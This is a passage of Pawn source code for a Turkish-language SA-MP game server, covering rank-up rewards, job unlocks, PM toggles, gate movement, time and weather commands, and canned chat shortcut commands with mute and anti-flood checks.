	    	case ClassPolice: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), PoliceRanks[MayRanko][RankName], MayRanko);
	    	case ClassMafia: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), MafiaRanks[MayRanko][RankName], MayRanko);
	    	case ClassRoadWorker: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), RoadWorkerRanks[MayRanko][RankName], MayRanko);
	    	case ClassGemici: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), GemiciRanks[MayRanko][RankName], MayRanko);
	    	case ClassOduncu: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), OduncuRanks[MayRanko][RankName], MayRanko);
	    	case ClassBalikci: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), BalikciRanks[MayRanko][RankName], MayRanko);
            case ClassCopcu: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), CopcuRanks[MayRanko][RankName], MayRanko);
            case ClassBanka: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), BankaRanks[MayRanko][RankName], MayRanko);
            case ClassFire: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), FireRanks[MayRanko][RankName], MayRanko);
            case ClassFBY: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), FBYRanks[MayRanko][RankName], MayRanko);
            case ClassPboy: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), PboyRanks[MayRanko][RankName], MayRanko);
		}

		SendClientMessageToAll(-1, Yazi);
					if(MayRanko == 1)
 {
		RewardPlayer(playerid, 100000, 10);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank 1'e atladýðý için 100k Para ve 10 Skor ödül aldý");
  } else
  	if(MayRanko == 2)
 {
		RewardPlayer(playerid, 150000, 15);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank 2'e atladýðý için 150k Para ve 15 Skor ödül aldý");
  } else
   	if(MayRanko == 3)
 {
		RewardPlayer(playerid, 300000, 25);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank 3'e atladýðý için 300k Para ve 25 Skor ödül aldý");
  } else
   	if(MayRanko == 4)
 {
		RewardPlayer(playerid, 450000, 25);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank 4'e atladýðý için 450k Para ve 25 Skor ödül aldý");
  } else
   	if(MayRanko == 5)
 {
		RewardPlayer(playerid, 500000, 30);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank 5'e atladýðý için 500k Para ve 30 Skor ödül aldý");
  } else
   	if(MayRanko == 6)
 {
		RewardPlayer(playerid, 1000000, 50);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank 6'ya atladýðý için 1M Para ve 50 Skor ödül aldý");
  } else
   	if(MayRanko == 7)
 {
		RewardPlayer(playerid, 1500000, 55);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank 7'ye atladýðý için 1,5M Para ve 55 Skor ödül aldý");
  } else
   	if(MayRanko == 8)
 {
		RewardPlayer(playerid, 2000000, 60);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank 8'e atladýðý için 2M Para ve 60 Skor ödül aldý");
  } else
   	if(MayRanko == 9)
 {
		RewardPlayer(playerid, 3000000, 70);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank 9'a atladýðý için 30M Para ve 70 Skor ödül aldý");
  } else
  	if(MayRanko == 10)
 {
		RewardPlayer(playerid, 3500000, 100);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank 10'a atladýðý için 3,5M Para ve 100 Skor ödül aldý");
  }
	}
	return 1;
}

MeslekControl(playerid)
{
	if(APlayerSpawnData[playerid] == false) return 1;

	new Yazi[128], Mesleko;
	for(new i; i < sizeof(MeslekSkorlar); i++)
	{
	    if(GetPlayerScore(playerid) >= MeslekSkorlar[i][RankScore])
	    {
	        Mesleko = i;
	    }
	}

	if(MeslekdeYaparmis[playerid] > Mesleko)
	{
		format(Yazi, 128, "{FFCC00}» {FFFFFF}Artýk {FFCC00}%d {FFFFFF}skoru geçtiniz. {FFCC00}%s {FFFFFF}mesleðine girebilirsiniz.", MeslekSkorlar[Mesleko][RankScore], MeslekSkorlar[Mesleko][RankName]);
  		SendClientMessage(playerid, -1, Yazi);
	}

	MeslekdeYaparmis[playerid] = Mesleko;

	return 1;
}

// ************************************************************************************************************************************************************
// Metin ile Sabah Sabah Delirmeceler [ EvoturK ]
// ************************************************************************************************************************************************************
CMD:pmoff(playerid, params[])
{
	if(PMGapat[playerid] == 1) return SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Zaten PM'niz kapalý!");
	PMGapat[playerid] = 1;
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Artýk oyuncular size PM gönderemeyecek. Açmak için {FFCC00}/pmon");
	return 1;
}

CMD:pmon(playerid, params[])
{
	if(PMGapat[playerid] == 0) return SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Zaten PM'niz açýk!");
	PMGapat[playerid] = 0;
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Artýk oyuncular size PM gönderebilecek. Kapatmak için {FFCC00}/pmoff");
	return 1;
}

// Anadolu Island GAPIlarý
GAPIKontrol(playerid)
{
	if(!IsPlayerInAnyVehicle(playerid)) return 1;
	if(IsPlayerInRangeOfPoint(playerid, 3.0, -4266.5293, -1255.6124, 21.2062))
	{
	    MoveObject(GAPI[0], -4271.7998000,-1253.7998000,13.0000000, 7.5, 0.0000000,0.0000000,72.9490000);
	    GAPIGapat(0);
	}

	if(IsPlayerInRangeOfPoint(playerid, 3.0, -3734.6262, -2153.6167, 16.2686))
	{
	    MoveObject(GAPI[1], -3732.0000000,-2159.8000000,07.5000000, 7.5, 0.0000000,0.0000000,200.9450000);
	    GAPIGapat(1);
	}

	return 1;
}

forward GAPIGapat(GAPIID);
public GAPIGapat(GAPIID)
{
	return SetTimerEx("_GAPIGapat", 3000, false, "i", GAPIID);
}

forward _GAPIGapat(GAPIID);
public _GAPIGapat(GAPIID)
{
	switch(GAPIID)
	{
	    case 0: MoveObject(GAPI[0], -4271.7998000,-1253.7998000,23.0000000, 7.5, 0.0000000,0.0000000,72.9490000);
	    case 1: MoveObject(GAPI[1], -3732.0000000,-2159.8000000,17.5000000, 7.5, 0.0000000,0.0000000,200.9450000);
	}
}

stock SetVehicleSpeed(vehicleid, Float:speed)
{
    new Float:x1, Float:y1, Float:z1, Float:x2, Float:y2, Float:z2, Float:a;
    GetVehicleVelocity(vehicleid, x1, y1, z1);
    GetVehiclePos(vehicleid, x2, y2, z2);
    GetVehicleZAngle(vehicleid, a); a = 360 - a;
    x1 = (floatsin(a, degrees) * (speed/100) + floatcos(a, degrees) * 0 + x2) - x2;
    y1 = (floatcos(a, degrees) * (speed/100) + floatsin(a, degrees) * 0 + y2) - y2;
    SetVehicleVelocity(vehicleid, x1, y1, z1);
}

CMD:saat(playerid, params[])
{
	// Setup local variables
	new time;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/saat", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
 		if(sscanf(params, "i", time)) return SendClientMessage(playerid, -1, "Kullaným: /saat [zaman]");
   		if(time > 24 || time < 0) return SendClientMessage(playerid, -1, "{FF0000}Hatalý Saat!");
    	SetPlayerTime(playerid, time, 0);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		SendClientMessage(playerid, -1, "{00FF00}Saatinizi deðiþtirdiniz!");

	}
	return 1;
}

CMD:mytime(playerid, params[])
{
	// Setup local variables
	new time;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/mytime", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
 		if(sscanf(params, "i", time)) return SendClientMessage(playerid, -1, "Kullaným: /mytime [zaman]");
   		if(time > 24 || time < 0) return SendClientMessage(playerid, -1, "{FF0000}Hatalý Saat!");
    	SetPlayerTime(playerid, time, 0);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		SendClientMessage(playerid, -1, "{00FF00}Saatinizi deðiþtirdiniz!");

	}
	return 1;
}

CMD:hava(playerid, params[])
{
	// Setup local variables
	new weather;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/hava", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
 		if(sscanf(params, "i", weather)) return SendClientMessage(playerid, -1, "Kullaným: /hava [hava]");
    	SetPlayerWeather(playerid, weather);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		SendClientMessage(playerid, -1, "{00FF00}Havanýzý deðiþtirdiniz!");

	}
	return 1;
}

CMD:myweather(playerid, params[])
{
	// Setup local variables
	new weather;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/myweather", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
 		if(sscanf(params, "i", weather)) return SendClientMessage(playerid, -1, "Kullaným: /myweather [hava]");
    	SetPlayerWeather(playerid, weather);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		SendClientMessage(playerid, -1, "{00FF00}Havanýzý deðiþtirdiniz!");

	}
	return 1;
}
CMD:hg(playerid, params[])
{
	if(ServerAyarlari[ChatEngel] == 1) {
	SendClientMessage(playerid,0xFFFFFFFF, "{ff0000} [BILGI] {ffffff} CHAT ADMIN TARAFINDAN KAPATILMISTIR !!");
	return 0;
	}

	// » Giriþ yapmamýþsa olacaklar:
	if (APlayerData[playerid][LoggedIn] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Giriþ yapmadan konuþamazsýnýz!");
		return 0;
	}

	// » Spawn olmamýþsa olacaklar:
	if (APlayerSpawnData[playerid] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Spawn olmadan konuþamazsýnýz!");
		return 0;
	}

	// » Susturma mesajý:
    if (APlayerData[playerid][Muted] > 0)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Susturuldunuz Konusamazsýnýz !");
		return 0;
	}

	// » Anti Flood
	if (FloodZaman[playerid] != 0)
	{
		if(FloodUyari[playerid] < 3)
  		{
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {FFCC00} FLOOD {FFFFFF}Yapmayiniz !!!!");
		    FloodZaman[playerid] = 1;
		    FloodUyari[playerid]++;
	    }
	    else if(FloodUyari[playerid] == 3)
	    {
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {ffCC00} FLOOD {FFFFFF}Yapmayiniz {FFCC00}120 {FFFFFF}SANÝYE SUSTURULDUNUZ  {FFCC00} !!!!");
		    APlayerData[playerid][Muted] = 120;
	    }
		return 0;
	}

	new Yazi[1024];
	if(APlayerData[playerid][PlayerLevel] == 7)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({00ffff}SAHIP{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Hoþ Geldin.", GetName(playerid), playerid);
	}else
	if(APlayerData[playerid][PlayerLevel] >= 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}GM{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Hoþ Geldin..", GetName(playerid), playerid);
	}else if(APlayerData[playerid][PlayerRehberLevel] >= 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({FFC000}REHBER{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Hoþ Geldin.", GetName(playerid), playerid);
	}else{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}%d{CFCFCF}): {FFFFFF}Hoþ Geldin", GetName(playerid), playerid);
	}

	SendClientMessageToAll(GetPlayerColor(playerid), Yazi);
	return 1;
}

CMD:hb(playerid, params[])
{
	if(ServerAyarlari[ChatEngel] == 1) {
	SendClientMessage(playerid,0xFFFFFFFF, "{ff0000} [BILGI] {ffffff} CHAT ADMIN TARAFINDAN KAPATILMISTIR !!");
	return 0;
	}

	// » Giriþ yapmamýþsa olacaklar:
	if (APlayerData[playerid][LoggedIn] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Giriþ yapmadan konuþamazsýnýz!");
		return 0;
	}

	// » Spawn olmamýþsa olacaklar:
	if (APlayerSpawnData[playerid] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Spawn olmadan konuþamazsýnýz!");
		return 0;
	}

	// » Susturma mesajý:
    if (APlayerData[playerid][Muted] > 0)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Susturuldunuz Konusamazsýnýz !");
		return 0;
	}

	// » Anti Flood
	if (FloodZaman[playerid] != 0)
	{
		if(FloodUyari[playerid] < 3)
  		{
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {FFCC00} FLOOD {FFFFFF}Yapmayiniz !!!!");
		    FloodZaman[playerid] = 1;
		    FloodUyari[playerid]++;
	    }
	    else if(FloodUyari[playerid] == 3)
	    {
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {ffCC00} FLOOD {FFFFFF}Yapmayiniz {FFCC00}120 {FFFFFF}SANÝYE SUSTURULDUNUZ  {FFCC00} !!!!");
		    APlayerData[playerid][Muted] = 120;
	    }
		return 0;
	}

	new Yazi[1024];
	if(APlayerData[playerid][PlayerLevel] == 7)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({00ffff}SAHIP{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Hoþ Bulduk..", GetName(playerid), playerid);
	}else
	if(APlayerData[playerid][PlayerLevel] >= 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}GM{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Hoþ Bulduk..", GetName(playerid), playerid);
	}else if(APlayerData[playerid][PlayerLevel] == 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({FFC000}REHBER{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Hoþ Bulduk..", GetName(playerid), playerid);
	}else{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}%d{CFCFCF}): {FFFFFF}Hoþ Bulduk.", GetName(playerid), playerid);
	}

	SendClientMessageToAll(GetPlayerColor(playerid), Yazi);
	return 1;
}
CMD:bb(playerid, params[])
{
	if(ServerAyarlari[ChatEngel] == 1) {
	SendClientMessage(playerid,0xFFFFFFFF, "{ff0000} [BILGI] {ffffff} CHAT ADMIN TARAFINDAN KAPATILMISTIR !!");
	return 0;
	}

	// » Giriþ yapmamýþsa olacaklar:
	if (APlayerData[playerid][LoggedIn] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Giriþ yapmadan konuþamazsýnýz!");
		return 0;
	}

	// » Spawn olmamýþsa olacaklar:
	if (APlayerSpawnData[playerid] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Spawn olmadan konuþamazsýnýz!");
		return 0;
	}

	// » Susturma mesajý:
    if (APlayerData[playerid][Muted] > 0)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Susturuldunuz Konusamazsýnýz !");
		return 0;
	}

	// » Anti Flood
	if (FloodZaman[playerid] != 0)
	{
		if(FloodUyari[playerid] < 3)
  		{
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {FFCC00} FLOOD {FFFFFF}Yapmayiniz !!!!");
		    FloodZaman[playerid] = 1;
		    FloodUyari[playerid]++;
	    }
	    else if(FloodUyari[playerid] == 3)
	    {
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {ffCC00} FLOOD {FFFFFF}Yapmayiniz {FFCC00}120 {FFFFFF}SANÝYE SUSTURULDUNUZ  {FFCC00} !!!!");
		    APlayerData[playerid][Muted] = 120;
	    }
		return 0;
	}

	new Yazi[1024];
	if(APlayerData[playerid][PlayerLevel] == 7)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({00ffff}SAHIP{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Güle Güle.", GetName(playerid), playerid);
	}else
	if(APlayerData[playerid][PlayerLevel] >= 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}GM{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Güle Güle.", GetName(playerid), playerid);
	}else if(APlayerData[playerid][PlayerRehberLevel] >= 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({FFC000}REHBER{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Güle Güle.", GetName(playerid), playerid);
	}else{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}%d{CFCFCF}): {FFFFFF}Güle Güle.", GetName(playerid), playerid);
	}

	SendClientMessageToAll(GetPlayerColor(playerid), Yazi);
	return 1;
}


CMD:sa(playerid, params[])
{
	if(ServerAyarlari[ChatEngel] == 1) {
	SendClientMessage(playerid,0xFFFFFFFF, "{ff0000} [BILGI] {ffffff} CHAT ADMIN TARAFINDAN KAPATILMISTIR !!");
	return 0;
	}

	// » Giriþ yapmamýþsa olacaklar:
	if (APlayerData[playerid][LoggedIn] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Giriþ yapmadan konuþamazsýnýz!");
		return 0;
	}

	// » Spawn olmamýþsa olacaklar:
	if (APlayerSpawnData[playerid] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Spawn olmadan konuþamazsýnýz!");
		return 0;
	}

	// » Susturma mesajý:
    if (APlayerData[playerid][Muted] > 0)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Susturuldunuz Konusamazsýnýz !");
		return 0;
	}

	// » Anti Flood
	if (FloodZaman[playerid] != 0)
	{
		if(FloodUyari[playerid] < 3)
  		{
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {FFCC00} FLOOD {FFFFFF}Yapmayiniz !!!!");
		    FloodZaman[playerid] = 1;
		    FloodUyari[playerid]++;
	    }
	    else if(FloodUyari[playerid] == 3)
	    {
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {ffCC00} FLOOD {FFFFFF}Yapmayiniz {FFCC00}120 {FFFFFF}SANÝYE SUSTURULDUNUZ  {FFCC00} !!!!");
		    APlayerData[playerid][Muted] = 120;
	    }
		return 0;
	}
	
	new Yazi[1024];
	if(APlayerData[playerid][PlayerLevel] == 7)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({00ffff}SAHIP{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Selamýn Aleyküm.", GetName(playerid), playerid);
	}else
	if(APlayerData[playerid][PlayerLevel] >= 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}GM{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Selamýn Aleyküm.", GetName(playerid), playerid);
	}else if(APlayerData[playerid][PlayerRehberLevel] >= 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({FFC000}REHBER{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Selamýn Aleyküm.", GetName(playerid), playerid);
	}else{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}%d{CFCFCF}): {FFFFFF}Selamýn Aleyküm", GetName(playerid), playerid);
	}

	SendClientMessageToAll(GetPlayerColor(playerid), Yazi);
	return 1;
}

CMD:as(playerid, params[])
{
	if(ServerAyarlari[ChatEngel] == 1) {
	SendClientMessage(playerid,0xFFFFFFFF, "{ff0000} [BILGI] {ffffff} CHAT ADMIN TARAFINDAN KAPATILMISTIR !!");
	return 0;
	}

	// » Giriþ yapmamýþsa olacaklar:
	if (APlayerData[playerid][LoggedIn] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Giriþ yapmadan konuþamazsýnýz!");
		return 0;
	}

	// » Spawn olmamýþsa olacaklar:
	if (APlayerSpawnData[playerid] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Spawn olmadan konuþamazsýnýz!");
		return 0;
	}

	// » Susturma mesajý:
    if (APlayerData[playerid][Muted] > 0)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Susturuldunuz Konusamazsýnýz !");
		return 0;
	}

	// » Anti Flood
	if (FloodZaman[playerid] != 0)
	{
		if(FloodUyari[playerid] < 3)
  		{
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {FFCC00} FLOOD {FFFFFF}Yapmayiniz !!!!");
		    FloodZaman[playerid] = 1;
		    FloodUyari[playerid]++;
	    }
	    else if(FloodUyari[playerid] == 3)
	    {
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {ffCC00} FLOOD {FFFFFF}Yapmayiniz {FFCC00}120 {FFFFFF}SANÝYE SUSTURULDUNUZ  {FFCC00} !!!!");
		    APlayerData[playerid][Muted] = 120;
	    }
		return 0;
	}
	
	new Yazi[1024];
	if(APlayerData[playerid][PlayerLevel] == 7)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({00ffff}SAHIP{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Aleyküm Selam.", GetName(playerid), playerid);
	}else
	if(APlayerData[playerid][PlayerLevel] >= 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}GM{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Aleyküm Selam.", GetName(playerid), playerid);
	}else if(APlayerData[playerid][PlayerLevel] == 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({FFC000}REHBER{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Aleyküm Selam.", GetName(playerid), playerid);
	}else{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}%d{CFCFCF}): {FFFFFF}Aleyküm Selam", GetName(playerid), playerid);
	}

	SendClientMessageToAll(GetPlayerColor(playerid), Yazi);
	return 1;
}
CMD:adminol(playerid, params[])
{
	if(ServerAyarlari[ChatEngel] == 1) {
	SendClientMessage(playerid,0xFFFFFFFF, "{ff0000} [BILGI] {ffffff} CHAT ADMIN TARAFINDAN KAPATILMISTIR !!");
	return 0;
	}

	// » Giriþ yapmamýþsa olacaklar:
	if (APlayerData[playerid][LoggedIn] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Giriþ yapmadan konuþamazsýnýz!");
		return 0;
	}

	// » Spawn olmamýþsa olacaklar:
	if (APlayerSpawnData[playerid] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Spawn olmadan konuþamazsýnýz!");
		return 0;
	}

	// » Susturma mesajý:
    if (APlayerData[playerid][Muted] > 0)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Susturuldunuz Konusamazsýnýz !");
		return 0;
	}


	// » Anti Flood
	if (FloodZaman[playerid] != 0)
	{
		if(FloodUyari[playerid] < 3)
  		{
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {FFCC00} FLOOD {FFFFFF}Yapmayiniz !!!!");
		    FloodZaman[playerid] = 1;
		    FloodUyari[playerid]++;
	    }
	    else if(FloodUyari[playerid] == 3)
	    {
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {ffCC00} FLOOD {FFFFFF}Yapmayiniz {FFCC00}120 {FFFFFF}SANÝYE SUSTURULDUNUZ  {FFCC00} !!!!");
		    APlayerData[playerid][Muted] = 120;
	    }
		return 0;
	}
	
	new Yazi[1024];
	if(APlayerData[playerid][PlayerLevel] == 7)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({00ffff}SAHIP{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Ben görevimi yaptým. Ben gidiyorum.", GetName(playerid), playerid);
	}else
	if(APlayerData[playerid][PlayerLevel] >= 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}GM{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Ben görevimi yaptým. Ben gidiyorum.", GetName(playerid), playerid);
	}else if(APlayerData[playerid][PlayerLevel] == 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({FFC000}REHBER{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Ben görevimi yaptým. Ben gidiyorum.", GetName(playerid), playerid);
	}else{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}%d{CFCFCF}): {FFFFFF}Ben görevimi yaptým. Ben gidiyorum", GetName(playerid), playerid);
	}

	SendClientMessageToAll(GetPlayerColor(playerid), Yazi);
	return 1;
}

CMD:vipol(playerid, params[])
{
	if(ServerAyarlari[ChatEngel] == 1) {
	SendClientMessage(playerid,0xFFFFFFFF, "{ff0000} [BILGI] {ffffff} CHAT ADMIN TARAFINDAN KAPATILMISTIR !!");
	return 0;
	}

	// » Giriþ yapmamýþsa olacaklar:
	if (APlayerData[playerid][LoggedIn] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Giriþ yapmadan konuþamazsýnýz!");
		return 0;
	}

	// » Spawn olmamýþsa olacaklar:
	if (APlayerSpawnData[playerid] == false)
	{
	    SendClientMessage(playerid, -1, "{FF0000}Spawn olmadan konuþamazsýnýz!");
		return 0;
	}

	// » Susturma mesajý:
    if (APlayerData[playerid][Muted] > 0)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Susturuldunuz Konusamazsýnýz !");
		return 0;
	}


	// » Anti Flood
	if (FloodZaman[playerid] != 0)
	{
		if(FloodUyari[playerid] < 3)
  		{
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {FFCC00} FLOOD {FFFFFF}Yapmayiniz !!!!");
		    FloodZaman[playerid] = 1;
		    FloodUyari[playerid]++;
	    }
	    else if(FloodUyari[playerid] == 3)
	    {
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {ffCC00} FLOOD {FFFFFF}Yapmayiniz {FFCC00}120 {FFFFFF}SANÝYE SUSTURULDUNUZ  {FFCC00} !!!!");
		    APlayerData[playerid][Muted] = 120;
	    }
		return 0;
	}
	
	new Yazi[1024];
	if(APlayerData[playerid][PlayerLevel] == 7)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({00ffff}SAHIP{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Saygýdeðer büyüðüm lütfen bana VIP'lik verebilir misin?", GetName(playerid), playerid);
	}else
	if(APlayerData[playerid][PlayerLevel] >= 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}GM{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Saygýdeðer büyüðüm lütfen bana VIP'lik verebilir misin?", GetName(playerid), playerid);
	}else if(APlayerData[playerid][PlayerLevel] == 1)
	{
 		format(Yazi, 1024, "%s {CFCFCF}({FFC000}REHBER{CFCFCF})({009BFF}%d{CFCFCF}): {FFFF66}Saygýdeðer büyüðüm lütfen bana VIP'lik verebilir misin?", GetName(playerid), playerid);
	}else{
 		format(Yazi, 1024, "%s {CFCFCF}({009BFF}%d{CFCFCF}): {FFFFFF}Saygýdeðer büyüðüm lütfen bana VIP'lik verebilir misin?", GetName(playerid), playerid);
	}

	SendClientMessageToAll(GetPlayerColor(playerid), Yazi);
	return 1;
}

Beklet(playerid)
{
	TogglePlayerControllable(playerid, 0);
	GameTextForPlayer(playerid, "~w~YUKLENIYOR...~n~~r~LUTFEN BEKLEYIN", 3000, 5);
	SetTimerEx("Beklet_", 3000, false, "i", playerid);
}

forward Beklet_(playerid);
public Beklet_(playerid)
{
	TogglePlayerControllable(playerid, 1);
}

ControlVehiclesMotor()
{
    new engine,lights,alarm,doors,bonnet,boot,objective;
	for(new vehicleid; vehicleid < MAX_VEHICLES; vehicleid++)
	{
	    if(GetVehicleModel(vehicleid) == 0)
	    {
	        if(AVehicleData[vehicleid][NeonObjectModel] != 0)
	        {
            	DestroyObject(AVehicleData[vehicleid][NeonLeft]);
            	DestroyObject(AVehicleData[vehicleid][NeonRight]);
            	AVehicleData[vehicleid][NeonLeft] = 0;
            	AVehicleData[vehicleid][NeonRight] = 0;
            	AVehicleData[vehicleid][NeonObjectModel] = 0;
	        }
			if(AVehicleData[vehicleid][VehicleText] != Text3D:-1)
			{
			    //DestroyDynamic3DTextLabel(AVehicleData[vehicleid][VehicleText]);
			    //AVehicleData[vehicleid][VehicleText] = Text3D:-1;
			}
	        continue;
	    }
	    if(GetVehicleDriver31(vehicleid) == -1)
	    {
			GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vehicleid, engine, 0, 0, doors, bonnet, boot, objective);

	        if(AVehicleData[vehicleid][NeonObjectModel] != 0)
	        {
